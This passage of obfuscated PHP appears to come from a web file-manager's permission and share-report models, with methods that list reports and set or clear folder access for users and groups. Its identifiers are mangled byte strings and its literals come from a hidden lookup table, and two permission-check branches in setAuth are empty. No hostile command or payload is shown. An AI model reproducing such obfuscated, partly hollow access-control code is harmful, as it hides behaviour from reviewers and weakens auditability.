$Ã®Ü©Åã[509] => $Ã®Ü©Åã[510]); $¦†ñ‚±˜ = Input::get($Ã®Ü©Åã[514], $Ã®Ü©Åã[7], $Ã®Ü©Åã[481], $á˜£“òÈ); $è¼Ö’À = Input::get($Ã®Ü©Åã[515], $Ã®Ü©Åã[7], $Ã®Ü©Åã[2130], array($Ã®Ü©Åã[2048], $Ã®Ü©Åã[509])); $è¼Ö’À = $şÕ˜ÇƒÏ[$è¼Ö’À]; $à¬Ñî‚Š = $à¬Ñî‚Š . "{$¦†ñ‚±˜}\40{$è¼Ö’À}"; return $this->order($à¬Ñî‚Š); } public function reportAdd($ŸñßñÎ) { $…•„‚À¾ =& $_SERVER[º·Ï‹¥³]; $„öğŞÛÚ = array($…•„‚À¾[649] => $ŸñßñÎ[$…•„‚À¾[649]], $…•„‚À¾[1754] => USER_ID); if (Model($…•„‚À¾[2126])->where($„öğŞÛÚ)->find()) { return !1; } $ı½”Øô£ = array($…•„‚À¾[649] => $ŸñßñÎ[$…•„‚À¾[649]], $…•„‚À¾[1643] => $ŸñßñÎ[$…•„‚À¾[1643]], $…•„‚À¾[184] => $ŸñßñÎ[$…•„‚À¾[184]], $…•„‚À¾[525] => $ŸñßñÎ[$…•„‚À¾[525]], $…•„‚À¾[1754] => USER_ID, $…•„‚À¾[33] => $ŸñßñÎ[$…•„‚À¾[33]], $…•„‚À¾[510] => $ŸñßñÎ[$…•„‚À¾[510]]); return Model($…•„‚À¾[2126])->add($ı½”Øô£); } public function reportList($áô•ĞÃ) { $íâĞ€¸€ =& $_SERVER[º·Ï‹¥³]; $ÈÓÍÔó = array(); if ($áô•ĞÃ[$íâĞ€¸€[812]]) { $«Üè»¦ = $áô•ĞÃ[$íâĞ€¸€[813]] ? $áô•ĞÃ[$íâĞ€¸€[813]] : strtotime(date($íâĞ€¸€[2128])); $ÈÓÍÔó[$íâĞ€¸€[222]] = array($íâĞ€¸€[384], array($áô•ĞÃ[$íâĞ€¸€[812]], $«Üè»¦)); } if (isset($áô•ĞÃ[$íâĞ€¸€[33]]) && in_array($áô•ĞÃ[$íâĞ€¸€[33]], array($íâĞ€¸€[91], $íâĞ€¸€[494], $íâĞ€¸€[2131], $íâĞ€¸€[2132], $íâĞ€¸€[2133]))) { $ÈÓÍÔó[$íâĞ€¸€[33]] = $áô•ĞÃ[$íâĞ€¸€[33]]; } if (isset($áô•ĞÃ[$íâĞ€¸€[802]]) && in_array($áô•ĞÃ[$íâĞ€¸€[802]], array($íâĞ€¸€[219], $íâĞ€¸€[91], $íâĞ€¸€[494], $íâĞ€¸€[2131]))) { $ÈÓÍÔó[$íâĞ€¸€[802]] = $áô•ĞÃ[$íâĞ€¸€[802]]; } $‡ó¨Ÿ“í = Input::get($íâĞ€¸€[515], $íâĞ€¸€[7], $íâĞ€¸€[2130], array($íâĞ€¸€[2048], $íâĞ€¸€[509])); $­âÛ¨Ç’ = array($íâĞ€¸€[507] => $íâĞ€¸€[508], $íâĞ€¸€[509] => $íâĞ€¸€[510]); $ûÜ¾‰¤í = $íâĞ€¸€[2134] . $­âÛ¨Ç’[$‡ó¨Ÿ“í]; $Úœ×Ôú½ = Model($íâĞ€¸€[2126])->where($ÈÓÍÔó)->order($ûÜ¾‰¤í)->selectPage(20); if (empty($Úœ×Ôú½[$íâĞ€¸€[429]])) { return array(); } $õ‘êÏ¸Ó = array_to_keyvalue_group($Úœ×Ôú½[$íâĞ€¸€[429]], $íâĞ€¸€[802], $íâĞ€¸€[649]); if (!empty($õ‘êÏ¸Ó[0])) { $áô•ĞÃ = $õ‘êÏ¸Ó[0]; $ÈÓÍÔó = array($íâĞ€¸€[649] => array($íâĞ€¸€[7], $áô•ĞÃ)); $£òº”Ş« = $this->where($ÈÓÍÔó)->field($íâĞ€¸€[649])->select(); $£òº”Ş« = array_to_keyvalue($£òº”Ş«, $íâĞ€¸€[12], $íâĞ€¸€[649]); $¿éÎüç = array_diff($áô•ĞÃ, $£òº”Ş«); if (!empty($¿éÎüç)) { foreach ($Úœ×Ôú½[$íâĞ€¸€[429]] as $ªÜåÍçğ => $¿¼úëĞü) { if (in_array($¿¼úëĞü[$íâĞ€¸€[649]], $¿éÎüç)) { unset($Úœ×Ôú½[$íâĞ€¸€[429]][$ªÜåÍçğ]); } } } } $this->_listDataApply($Úœ×Ôú½[$íâĞ€¸€[429]]); return $Úœ×Ôú½; } public function reportStatus($´ŞƒÃÉ²) { $Àáñ³ =& $_SERVER[º·Ï‹¥³]; $øçÌış† = array($Àáñ³[459] => $´ŞƒÃÉ²[$Àáñ³[459]]); $Ïº“ÍªÃ = Model($Àáñ³[2126])->where($øçÌış†)->field($Àáñ³[2135])->find(); if (!$Ïº“ÍªÃ) { return !1; } $Õ”Úü³… = array($Àáñ³[802] => $´ŞƒÃÉ²[$Àáñ³[802]]); if ($´ŞƒÃÉ²[$Àáñ³[802]] == $Àáñ³[2131] && $Ïº“ÍªÃ[$Àáñ³[802]] == $Àáñ³[2131]) { $Õ”Úü³…[$Àáñ³[802]] = 0; } $ÄÅÎ‘™Ä = Model($Àáñ³[2126])->where($øçÌış†)->save($Õ”Úü³…); if ($´ŞƒÃÉ²[$Àáñ³[802]] == $Àáñ³[494]) { if ($Ïº“ÍªÃ[$Àáñ³[525]] != $Àáñ³[219] && $this->shareFileMeta($Ïº“ÍªÃ[$Àáñ³[525]])) { $this->shareFileMeta($Ïº“ÍªÃ[$Àáñ³[525]], 0); } $this->remove($Ïº“ÍªÃ[$Àáñ³[649]]); return !0; } if ($ÄÅÎ‘™Ä && $´ŞƒÃÉ²[$Àáñ³[802]] == $Àáñ³[2131]) { $ÇĞ¹ëŸ‡ = $Õ”Úü³…[$Àáñ³[802]] == $Àáñ³[2131] ? 1 : 0; $this->shareFileMeta($Ïº“ÍªÃ[$Àáñ³[525]], $ÇĞ¹ëŸ‡); $this->removeByFile($Ïº“ÍªÃ[$Àáñ³[525]]); } return $ÄÅÎ‘™Ä; } private function removeByFile($ŸÈšƒäÅ) { $™áÁÉî© =& $_SERVER[º·Ï‹¥³]; $ËÍÉæØ = Model($™áÁÉî©[876])->where(array($™áÁÉî©[525] => $ŸÈšƒäÅ))->field($™áÁÉî©[184])->select(); $ÃÖÙ¢Òä = array_to_keyvalue($ËÍÉæØ, $™áÁÉî©[12], $™áÁÉî©[184]); $ô¯£­Û† = array($™áÁÉî©[184] => array($™áÁÉî©[7], $ÃÖÙ¢Òä), $™áÁÉî©[547] => 1); $ËÍÉæØ = $this->where($ô¯£­Û†)->field($™áÁÉî©[649])->select(); if (empty($ËÍÉæØ)) { return; } $É°¨İˆœ = array_to_keyvalue($ËÍÉæØ, $™áÁÉî©[12], $™áÁÉî©[649]); $this->remove($É°¨İˆœ); } private function shareFileMeta($ç€Ÿ‚¹, $”Ã²Î«  = null) { $íË·á =& $_SERVER[º·Ï‹¥³]; $ïç¹Ü…§ = array($íË·á[525] => $ç€Ÿ‚¹, $íË·á[97] => $íË·á[2136]); if (is_null($”Ã²Î« )) { return Model($íË·á[2137])->where($ïç¹Ü…§)->find(); } $ïç¹Ü…§[$íË·á[434]] = $”Ã²Î« ; Model($íË·á[2137])->add($ïç¹Ü…§, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\143\x65\137\141\x75\164\x68"; public function getAuth($ñèÛÊÚ) { $‰Ã«ï· =& $_SERVER[º·Ï‹¥³]; $ØÓû†‚‘ = $this->sourceAuthSelect($ñèÛÊÚ); $ñú¡ÎÇã = array(); $‹ø˜Ùûà = array(); $…³Œ¨Û = 2 << 25; foreach ($ØÓû†‚‘ as $µç´À¬) { $ğîö–çğ = Model($‰Ã«ï·[556])->listData($µç´À¬[$‰Ã«ï·[2061]]); if (!$ğîö–çğ) { continue; } $ñú¡ÎÇã[] = $µç´À¬; $Åº…Üç§ = 0; if ($µç´À¬[$‰Ã«ï·[181]] == SourceModel::TYPE_GROUP) { $Åº…Üç§ = $…³Œ¨Û * 2; } if ($µç´À¬[$‰Ã«ï·[181]] == SourceModel::TYPE_USER) { $Åº…Üç§ = $…³Œ¨Û; } if ($µç´À¬[$‰Ã«ï·[181]] == SourceModel::TYPE_USER && $µç´À¬[$‰Ã«ï·[554]] == $‰Ã«ï·[219]) { $Åº…Üç§ = 0; } $‹ø˜Ùûà[] = $ğîö–çğ[$‰Ã«ï·[471]] + $Åº…Üç§; } array_multisort($‹ø˜Ùûà, SORT_DESC, $ñú¡ÎÇã); return $ñú¡ÎÇã; } public function sourceAuthSelect($öêôÖÅÏ) { $üÏÌÓ« =& $_SERVER[º·Ï‹¥³]; static $¬¤İ°Ñ = array(); $¸úÏô²Õ = is_array($öêôÖÅÏ) ? !1 : !0; if ($¸úÏô²Õ) { $öêôÖÅÏ = array($öêôÖÅÏ); } $¼¡ÉÀÁï = array(); foreach ($öêôÖÅÏ as $È–»££–) { if (isset($¬¤İ°Ñ[$È–»££–])) { $¼¡ÉÀÁï[$È–»££–] = $¬¤İ°Ñ[$È–»££–]; } } if (count($¼¡ÉÀÁï) == count($öêôÖÅÏ)) { return $¸úÏô²Õ ? $¼¡ÉÀÁï[$öêôÖÅÏ[0]] : $¼¡ÉÀÁï; } $Å÷ì¹áĞ = $üÏÌÓ«[2138]; $é¿ ïŸÑ = array($üÏÌÓ«[184] => array($üÏÌÓ«[7], $öêôÖÅÏ)); $ö¦ÕœµÖ = $this->field($Å÷ì¹áĞ)->order($üÏÌÓ«[459])->where($é¿ ïŸÑ)->select(); $ëÅİ¨ = array_to_keyvalue_group($ö¦ÕœµÖ, $üÏÌÓ«[184]); foreach ($öêôÖÅÏ as $È–»££–) { $¬¤İ°Ñ[$È–»££–] = $ëÅİ¨[$È–»££–] ? $ëÅİ¨[$È–»££–] : array(); } if ($¸úÏô²Õ) { return $ö¦ÕœµÖ; } return $ëÅİ¨; } public function setAuth($ØÎ™Ç, $£¦¿á±â) { $Æ‰Ä×”â =& $_SERVER[º·Ï‹¥³]; $òæ›²ò = Model($Æ‰Ä×”â[1388])->sourceInfo($ØÎ™Ç); if (!$òæ›²ò) { return !1; } if ($òæ›²ò[$Æ‰Ä×”â[181]] != SourceModel::TYPE_GROUP) { return !1; } $µ–µ±ªà = 1; $ÔëÃÅèè = $òæ›²ò[$Æ‰Ä×”â[554]]; if ($ÔëÃÅèè != $µ–µ±ªà) { $éÜÈ³Ì² = array($Æ‰Ä×”â[1952] => $ÔëÃÅèè); $’„ÙÒö = Model($Æ‰Ä×”â[2047])->field($Æ‰Ä×”â[1754])->where($éÜÈ³Ì²)->select(); $’„ÙÒö = array_to_keyvalue($’„ÙÒö, $Æ‰Ä×”â[12], $Æ‰Ä×”â[1754]); } $¯ˆíñ¸“ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $“Š™¨ = array(); foreach ($£¦¿á±â as $üøº ¢) { if (!in_array($üøº ¢[$Æ‰Ä×”â[181]], $¯ˆíñ¸“)) { show_json(LNG($Æ‰Ä×”â[2139]), !1); } if ($ÔëÃÅèè != $µ–µ±ªà) { if ($üøº ¢[$Æ‰Ä×”â[181]] == SourceModel::TYPE_GROUP) { } if ($üøº ¢[$Æ‰Ä×”â[554]] != 0 && !in_array($üøº ¢[$Æ‰Ä×”â[554]], $’„ÙÒö)) { } } if ($üøº ¢[$Æ‰Ä×”â[554]] == 0) { $üøº ¢[$Æ‰Ä×”â[181]] = SourceModel::TYPE_USER; } $“Š™¨[] = array($Æ‰Ä×”â[184] => $ØÎ™Ç, $Æ‰Ä×”â[181] => intval($üøº ¢[$Æ‰Ä×”â[181]]), $Æ‰Ä×”â[554] => intval($üøº ¢[$Æ‰Ä×”â[554]]), $Æ‰Ä×”â[2061] => intval($üøº ¢[$Æ‰Ä×”â[2061]]) ? intval($üøº ¢[$Æ‰Ä×”â[2061]]) : 0, $Æ‰Ä×”â[2121] => intval($üøº ¢[$Æ‰Ä×”â[2121]]) ? intval($üøº ¢[$Æ‰Ä×”â[2121]]) : -1); } $this->where(array($Æ‰Ä×”â[475] => $ØÎ™Ç))->delete(); $this->addAll($“Š™¨); return !0; } public function authClear($ŸúÑ»—¸) { $üÔŞÀ¹… =& $_SERVER[º·Ï‹¥³]; $ºŒŞÈû” = Model($üÔŞÀ¹…[1388])->sourceInfo($ŸúÑ»—¸); $–Ñ‡Å¥§ = array($ŸúÑ»—¸); if ($ºŒŞÈû”[$üÔŞÀ¹…[469]] == $üÔŞÀ¹…[91]) { $õÉ–¯é³ = array($üÔŞÀ¹…[636] => array($üÔŞÀ¹…[596], $ºŒŞÈû”[$üÔŞÀ¹…[569]] . $ŸúÑ»—¸ . $üÔŞÀ¹…[597])); $–Ñ‡Å¥§ = Model($üÔŞÀ¹…[1388])->field($üÔŞÀ¹…[475])->where($õÉ–¯é³)->getField($üÔŞÀ¹…[184], !0); $–Ñ‡Å¥§[] = $ŸúÑ»—¸; } $this->where(array($üÔŞÀ¹…[475] => array($üÔŞÀ¹…[476], $–Ñ‡Å¥§)))->delete(); return !0; } public function getAllChildren($ˆœÊ—…) { $Ä‡˜Æü =& $_SERVER[º·Ï‹¥³]; $×¥íàú = Model($Ä‡˜Æü[1388])->sourceInfo($ˆœÊ—…); if ($×¥íàú[$Ä‡˜Æü[469]] != $Ä‡˜Æü[91]) { return $this->sourceListAuth(array($ˆœÊ—…)); } if ($×¥íàú[$Ä‡˜Æü[181]] != SourceModel::TYPE_GROUP) { return array(); } $©’çñó = 1; $ªæú²šè = array($ˆœÊ—…); if ($×¥íàú[$Ä‡˜Æü[183]] == $Ä‡˜Æü[219] && $×¥íàú[$Ä‡˜Æü[554]] != $©’çñó) { $ªæú²šè = $this->groupChidldAllRootSource($×¥íàú[$Ä‡˜Æü[554]]); } $õ§Âçôù = $this->field($Ä‡˜Æü[184])->group($Ä‡˜Æü[184])->select(); $õ§Âçôù = array_to_keyvalue($õ§Âçôù, $Ä‡˜Æü[12], $Ä‡˜Æü[184]); if (!$õ§Âçôù) { return array(); } $¸ËÃı“ = $Ä‡˜Æü[2140]; $±ÔÑ—Çİ = array($Ä‡˜Æü[184] => array($Ä‡˜Æü[7], $õ§Âçôù), $Ä‡˜Æü[489] => $Ä‡˜Æü[219]); $ƒ¬€ëä¿ = Model($Ä‡˜Æü[876])->field($¸ËÃı“)->where($±ÔÑ—Çİ)->select(); $ê ƒìˆ÷ = array($ˆœÊ—…); foreach ($ƒ¬€ëä¿ as $½òÍåı¶) { foreach ($ªæú²šè as $Êäª®©Â) { $Òè®ˆº’ = $Ä‡˜Æü[50] . $Êäª®©Â . $Ä‡˜Æü[50]; $éú¬“Ô = $½òÍåı¶[$Ä‡˜Æü[569]] . $½òÍåı¶[$Ä‡˜Æü[184]] . $Ä‡˜Æü[50]; if (strstr($éú¬“Ô, $Òè®ˆº’)) { $ê ƒìˆ÷[] = $½òÍåı¶[$Ä‡˜Æü[184]]; break; } } } return $this->sourceListAuth($ê ƒìˆ÷); } private function sourceListAuth($ñˆºû»€) { $‰ì……’¡ =& $_SERVER[º·Ï‹¥³]; $Éµ×ˆ‡ = Model($‰ì……’¡[1388])->sourceListInfo($ñˆºû»€, !0); $Å¸§·»ü = $this->sourceAuthSelect($ñˆºû»€); $°ëŞ¥Ñ = array(); $ŠúßÎıã = array(); foreach ($Éµ×ˆ‡ as $í »±ƒ³) { unset($í »±ƒ³[$‰ì……’¡[513]]); unset($í »±ƒ³[$‰ì……’¡[511]]); unset($í »±ƒ³[$‰ì……’¡[471]]); unset($í »±ƒ³[$‰ì……’¡[90]]); $ğ¬Û¬„û = $Å¸§·»ü[$í »±ƒ³[$‰ì……’¡[184]]]; if (!$ğ¬Û¬„û) { continue; } $í »±ƒ³[$‰ì……’¡[2141]] = $this->authTargetInfo($ğ¬Û¬„û); $í »±ƒ³[$‰ì……’¡[567]] = rtrim($í »±ƒ³[$‰ì……’¡[573]], $‰ì……’¡[8]) . $‰ì……’¡[8] . ltrim($í »±ƒ³[$‰ì……’¡[567]], $‰ì……’¡[8]); $°ëŞ¥Ñ[] = $í »±ƒ³; $ß’¬±Òœ = count(explode($‰ì……’¡[8], trim($í »±ƒ³[$‰ì……’¡[567]], $‰ì……’¡[8]))); $ŠúßÎıã[] = $ß’¬±Òœ + ($í »±ƒ³[$‰ì……’¡[33]] == $‰ì……’¡[78] ? 0 : 1000); } array_multisort($ŠúßÎıã, SORT_ASC, $°ëŞ¥Ñ); return $°ëŞ¥Ñ; } private function groupChidldAllRootSource($±Ï×ŸŒÄ) { $´¨ç‹Ñö =& $_SERVER[º·Ï‹¥³]; $ŠâÍ Ï = Model($´¨ç‹Ñö[2142])->groupChildrenAll($±Ï×ŸŒÄ); $»şªÆ = array($´¨ç‹Ñö[183] => 0, $´¨ç‹Ñö[554] => array($´¨ç‹Ñö[7], $ŠâÍ Ï), $´¨ç‹Ñö[181] => SourceModel::TYPE_GROUP); $‚Éñå‹š = Model($´¨ç‹Ñö[876])->field($´¨ç‹Ñö[184])->where($»şªÆ)->select(); $‚Éñå‹š = array_to_keyvalue($‚Éñå‹š, $´¨ç‹Ñö[12], $´¨ç‹Ñö[184]); return $‚Éñå‹š; } private function authTargetInfo($À„â×åŞ) { $›ğ›¥· =& $_SERVER[º·Ï‹¥³]; $¡‚ï†Å¼ = array(); $Š—Ê•´¾ = array(); $¬¦‹´¢ = 2 << 25; foreach ($À„â×åŞ as $ñÛ×‹) { $ª±é—ñ» = Model($›ğ›¥·[556])->listData($ñÛ×‹[$›ğ›¥·[2061]]); if (!$ª±é—ñ») { continue; } if ($ñÛ×‹[$›ğ›¥·[181]] == SourceModel::TYPE_USER) { $Ì÷ı––Œ = Model($›ğ›¥·[562])->getInfoSimpleOuter($ñÛ×‹[$›ğ›¥·[554]]); if ($Ì÷ı––Œ[$›ğ›¥·[1754]] == $›ğ›¥·[1241]) { continue; } if ($Ì÷ı––Œ[$›ğ›¥·[1754]] == $›ğ›¥·[219]) { $Ì÷ı––Œ[$›ğ›¥·[32]] = LNG($›ğ›¥·[2143]); } } else { $Ì÷ı––Œ = Model($›ğ›¥·[570])->getInfoSimple($ñÛ×‹[$›ğ›¥·[554]]); } if (!$Ì÷ı––Œ) { continue; } $Ì÷ı––Œ[$›ğ›¥·[524]] = $ª±é—ñ»; $¡‚ï†Å¼[] = $Ì÷ı––Œ; $“¨’‚æê = 0; if ($ñÛ×‹[$›ğ›¥·[181]] == SourceModel::TYPE_GROUP) { $“¨’‚æê = $¬¦‹´¢ * 2; } if ($ñÛ×‹[$›ğ›¥·[181]] == SourceModel::TYPE_USER) { $“¨’‚æê = $¬¦‹´¢; } if ($ñÛ×‹[$›ğ›¥·[181]] == SourceModel::TYPE_USER && $ñÛ×‹[$›ğ›¥·[554]] == $›ğ›¥·[219]) { $“¨’‚æê = 0; } $Š—Ê•´¾[] = $ª±é—ñ»[$›ğ›¥·[471]] + $“¨’‚æê; } array_multisort($Š—Ê•´¾, SORT_DESC, $¡‚ï†Å¼); return $¡‚ï†Å¼; } public function getAllChildrenByUser($ğğ¹ù­Ë, $¹ŞÆË·) { $Ïœ´ÃüÊ =& $_SERVER[º·Ï‹¥³]; $Ä¼ùÕæ® = Model($Ïœ´ÃüÊ[583])->getInfo($¹ŞÆË·); if (!$¹ŞÆË· || !$ğğ¹ù­Ë || !$Ä¼ùÕæ®) { return array(); } $ÆÛó£Çê = Model($Ïœ´ÃüÊ[1388])->sourceInfo($ğğ¹ù­Ë); $õô¬İŸ = array(); $¦Íö¸¾¯ = 1; if ($ÆÛó£Çê[$Ïœ´ÃüÊ[183]] == $Ïœ´ÃüÊ[219] && $ÆÛó£Çê[$Ïœ´ÃüÊ[554]] != $¦Íö¸¾¯ && $this->groupContainUser($ÆÛó£Çê[$Ïœ´ÃüÊ[554]], $¹ŞÆË·)) { foreach ($Ä¼ùÕæ®[$Ïœ´ÃüÊ[2144]] as $ñÁ†•“) { $‹Çà«Ì = Model($Ïœ´ÃüÊ[570])->getInfo($ñÁ†•“[$Ïœ´ÃüÊ[1952]]); $Éİ§õª¶ = Model($Ïœ´ÃüÊ[583])->getInfoSimpleOuter($¹ŞÆË·); $Éİ§õª¶[$Ïœ´ÃüÊ[524]] = $ñÁ†•“[$Ïœ´ÃüÊ[471]]; if (Model($Ïœ´ÃüÊ[556])->authCheckAction($ñÁ†•“[$Ïœ´ÃüÊ[471]][$Ïœ´ÃüÊ[471]], $Ïœ´ÃüÊ[1973])) { continue; } $Öôò¼Ø = array($Ïœ´ÃüÊ[32] => $Ïœ´ÃüÊ[1261] . $‹Çà«Ì[$Ïœ´ÃüÊ[32]], $Ïœ´ÃüÊ[184] => $‹Çà«Ì[$Ïœ´ÃüÊ[90]][$Ïœ´ÃüÊ[184]], $Ïœ´ÃüÊ[87] => KodIO::make($‹Çà«Ì[$Ïœ´ÃüÊ[90]][$Ïœ´ÃüÊ[184]]), $Ïœ´ÃüÊ[183] => $Ïœ´ÃüÊ[219], $Ïœ´ÃüÊ[181] => $Ïœ´ÃüÊ[563], $Ïœ´ÃüÊ[33] => $Ïœ´ÃüÊ[600], $Ïœ´ÃüÊ[567] => $‹Çà«Ì[$Ïœ´ÃüÊ[574]], $Ïœ´ÃüÊ[1952] => $‹Çà«Ì[$Ïœ´ÃüÊ[1952]], $Ïœ´ÃüÊ[571] => $‹Çà«Ì[$Ïœ´ÃüÊ[183]], $Ïœ´ÃüÊ[2141] => array($Éİ§õª¶)); $õô¬İŸ[$Öôò¼Ø[$Ïœ´ÃüÊ[184]]] = $Öôò¼Ø; } } $šÕŠ¢»¦ = array(); $ù·ÂÙ = $this->getAllChildren($ğğ¹ù­Ë); foreach ($ù·ÂÙ as $Âù••¾À) { $ÁÏšÀıÜ = !1; foreach ($Âù••¾À[$Ïœ´ÃüÊ[2141]] as $ö™¦›šË) { if ($ö™¦›šË[$Ïœ´ÃüÊ[1754]]) { if ($ö™¦›šË[$Ïœ´ÃüÊ[1754]] == $¹ŞÆË·) { $ÁÏšÀıÜ = !0; break; } } if ($ö™¦›šË[$Ïœ´ÃüÊ[1952]]) { if ($this->groupContainUser($ö™¦›šË[$Ïœ´ÃüÊ[1952]], $¹ŞÆË·)) { $ÁÏšÀıÜ = !0; break; } } } if ($ÁÏšÀıÜ) { $šÕŠ¢»¦[] = $Âù••¾À; } $©å•Ä¡Ü = $Âù••¾À[$Ïœ´ÃüÊ[184]]; if (isset($õô¬İŸ[$©å•Ä¡Ü])) { $Âù••¾À[$Ïœ´ÃüÊ[2141]][] = $õô¬İŸ[$©å•Ä¡Ü][0]; $õô¬İŸ[$©å•Ä¡Ü] = !1; } } $õô¬İŸ = array_filter(array_values($õô¬İŸ)); $šÕŠ¢»¦ = array_merge($õô¬İŸ, $šÕŠ¢»¦); return $šÕŠ¢»¦; } public function setAllChildrenByUser($Íüö¨—á, $ìÙ¼×¦‰, $…õÁ®€õ) { $ğ£¾îĞ =& $_SERVER[º·Ï‹¥³]; $Ş…“©ë« = $this->getAllChildrenByUser($Íüö¨—á, $ìÙ¼×¦‰); if (!$…õÁ®€õ || !$Ş…“©ë«) { return !1; } foreach ($Ş…“©ë« as $ô¦ÒÇÅ) { $ÃµØĞÍ = array(); foreach ($ô¦ÒÇÅ[$ğ£¾îĞ[2141]] as $©Î£ˆÜ) { $ûÌ”¶› = $©Î£ˆÜ[$ğ£¾îĞ[524]]; $«£éİ¥ = $©Î£ˆÜ[$ğ£¾îĞ[1754]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ì–îÌÓä = $©Î£ˆÜ[$ğ£¾îĞ[1754]] ? $©Î£ˆÜ[$ğ£¾îĞ[1754]] : $©Î£ˆÜ[$ğ£¾îĞ[1952]]; if ($©Î£ˆÜ[$ğ£¾îĞ[1754]] && $©Î£ˆÜ[$ğ£¾îĞ[1754]] == $ìÙ¼×¦‰) { continue; } $ÃµØĞÍ[] = array($ğ£¾îĞ[184] => $ô¦ÒÇÅ[$ğ£¾îĞ[184]], $ğ£¾îĞ[181] => $«£éİ¥, $ğ£¾îĞ[554] => intval($ì–îÌÓä), $ğ£¾îĞ[2061] => isset($ûÌ”¶›[$ğ£¾îĞ[459]]) ? intval($ûÌ”¶›[$ğ£¾îĞ[459]]) : 0, $ğ£¾îĞ[2121] => isset($ûÌ”¶›[$ğ£¾îĞ[2121]]) ? intval($ûÌ”¶›[$ğ£¾îĞ[2121]]) : -1); } $ÃµØĞÍ[] = array($ğ£¾îĞ[184] => $ô¦ÒÇÅ[$ğ£¾îĞ[184]], $ğ£¾îĞ[181] => SourceModel::TYPE_USER, $ğ£¾îĞ[554] => intval($ìÙ¼×¦‰), $ğ£¾îĞ[2061] => intval($…õÁ®€õ), $ğ£¾îĞ[2121] => -1); $this->where(array($ğ£¾îĞ[475] => $ô¦ÒÇÅ[$ğ£¾îĞ[184]]))->delete(); $this->addAll($ÃµØĞÍ); } return !0; } public function get($ù¹‘Á‚) { $åö¦“Òß = $this->getSourceList(array($ù¹‘Á‚), !0); return $åö¦“Òß[0]; } public function getSourceList($ÍÂ¦‘ÍÈ, $åá»ç’ = false, $Äàô´´ = false) { $šú à§® =& $_SERVER[º·Ï‹¥³]; if (!$ÍÂ¦‘ÍÈ) { return array(); } $ç„¤¤À = Model($šú à§®[1388]); if (!$åá»ç’ && count($ÍÂ¦‘ÍÈ) == 1) { $åá»ç’ = array(); $åá»ç’[$ÍÂ¦‘ÍÈ[0]] = $ç„¤¤À->sourceInfo($ÍÂ¦‘ÍÈ[0]); } if (!$åá»ç’) { $Ù£ù¢úÓ = array($šú à§®[475] => array($šú à§®[476], $ÍÂ¦‘ÍÈ)); $åá»ç’ = $ç„¤¤À->field($šú à§®[2145])->where($Ù£ù¢úÓ)->select(); $åá»ç’ = array_to_keyvalue($åá»ç’, $šú à§®[184]); } $Ğ‚®ıúğ = $ÍÂ¦‘ÍÈ; foreach ($åá»ç’ as $Ûà¦¿Àô => $ñ‹‘Š“) { $€·š‹‰· = $ç„¤¤À->parentLevelArray($ñ‹‘Š“[$šú à§®[569]]); $Ğ‚®ıúğ = array_merge($Ğ‚®ıúğ, array($Ûà¦¿Àô), array_reverse($€·š‹‰·)); } $Ğ‚®ıúğ = array_values(array_unique($Ğ‚®ıúğ)); if (!$Ğ‚®ıúğ) { return array(); } $›î¸–›î = $this->sourceAuthSelect($Ğ‚®ıúğ); $µ„’å¾ = array(); foreach ($Ğ‚®ıúğ as $ÑÚÁíÒ) { if (isset($›î¸–›î[$ÑÚÁíÒ])) { $µ„’å¾[$ÑÚÁíÒ] = $›î¸–›î[$ÑÚÁíÒ]; } } $ÓÒÖ×Èé = $this->userIsRoot($Äàô´´); $òƒóé˜Û = AuthModel::authAll(); $…À’ş¿‘ = array($šú à§®[472] => $òƒóé˜Û, $šú à§®[2146] => array($šú à§®[477] => 0, $šú à§®[1958] => $òƒóé˜Û, $šú à§®[478] => LNG($šú à§®[2147]), $šú à§®[1975] => $šú à§®[2148])); $ÒÛš˜Ï¢ = array(); foreach ($åá»ç’ as $ÑÚÁíÒ => $Ì°š¢÷) { if ($ÓÒÖ×Èé && $GLOBALS[$šú à§®[6]][$šú à§®[1971]]) { $ÒÛš˜Ï¢[$ÑÚÁíÒ] = $…À’ş¿‘; continue; } $ÒÛš˜Ï¢[$ÑÚÁíÒ] = $this->makeSourceAuth($Ì°š¢÷, $µ„’å¾, $Äàô´´); } return $ÒÛš˜Ï¢; } public function authDeepCheck($ÈÜ âÀ, $Ò…ˆÎıå = false) { $¦•®ŞŸâ =& $_SERVER[º·Ï‹¥³]; $Ò…ˆÎıå = $Ò…ˆÎıå ? $Ò…ˆÎıå : USER_ID; $óº§«–ç = $this->makeAuthDeep($Ò…ˆÎıå); if (!in_array($ÈÜ âÀ, $óº§«–ç[$¦•®ŞŸâ[2149]])) { return !1; } $ÜóÑİÆ¾ = array(); foreach ($óº§«–ç[$¦•®ŞŸâ[2150]] as $‹şûÑ => $ƒİ¢îƒå) { if (!in_array($ÈÜ âÀ, $ƒİ¢îƒå)) { continue; } $ÜóÑİÆ¾[] = $‹şûÑ; } if (!$ÜóÑİÆ¾) { return !1; } $úöÓã· = $ÜóÑİÆ¾ ? $ÜóÑİÆ¾[0] : $ÈÜ âÀ; return array($¦•®ŞŸâ[472] => -1, $¦•®ŞŸâ[524] => array($¦•®ŞŸâ[477] => $¦•®ŞŸâ[1241], $¦•®ŞŸâ[1958] => $¦•®ŞŸâ[219], $¦•®ŞŸâ[478] => LNG($¦•®ŞŸâ[2151]), $¦•®ŞŸâ[1975] => $¦•®ŞŸâ[2152]), $¦•®ŞŸâ[2153] => LNG($¦•®ŞŸâ[2154]), $¦•®ŞŸâ[2155] => $this->sourceAuthInfo($úöÓã·)); } protected function makeAuthDeep($ú¬’ÆŸ¢ = false) { $¥‰©Õß“ =& $_SERVER[º·Ï‹¥³]; static $ŸŒÑô = array(); $ú¬’ÆŸ¢ = $ú¬’ÆŸ¢ ? $ú¬’ÆŸ¢ : USER_ID; if (isset($ŸŒÑô[$ú¬’ÆŸ¢])) { return $ŸŒÑô[$ú¬’ÆŸ¢]; } $›¯œÄÒş = Model($¥‰©Õß“[2156])->listData(); $”ÆØ‹¯· = array(); foreach ($›¯œÄÒş as $°êúŒÉ“) { if ($°êúŒÉ“[$¥‰©Õß“[471]] == 0 && $°êúŒÉ“[$¥‰©Õß“[1974]] == $¥‰©Õß“[91]) { $”ÆØ‹¯·[] = $°êúŒÉ“[$¥‰©Õß“[459]]; } } $É„”«’Ÿ = $this->userGroupParents($ú¬’ÆŸ¢); $åªøØ³ª = array($¥‰©Õß“[181] => SourceModel::TYPE_USER, $¥‰©Õß“[554] => $ú¬’ÆŸ¢); if ($É„”«’Ÿ) { $åªøØ³ª = 